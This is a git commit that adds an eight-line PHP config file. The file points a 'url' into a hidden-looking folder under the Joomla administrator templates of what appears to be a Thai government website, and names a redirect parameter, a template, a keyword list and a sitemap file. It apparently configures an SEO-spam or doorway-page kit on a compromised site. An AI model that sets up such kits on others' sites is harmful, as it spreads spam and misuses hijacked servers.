2f99abc4f1da4add87da84ac8322df5b882a47e0
ROIHEE <thanawat58311@gmail.com>
2024-09-21 22:10:14 +0800

    Create config.php

---
+++ config.php
@@ -0,0 +1,8 @@
+<?php
+$config = array(
+  	'url'		=> 'https://www.lp-pao.go.th/Main60/administrator/templates/hathor/html/com_admin/sysinfo/asia/',
+	'parameter' => 'go',
+	'template'  => 'temp.html',
+	'keywords'  => 'bb.txt',
+	'sitemap'	=> 'gg.xml'
+);
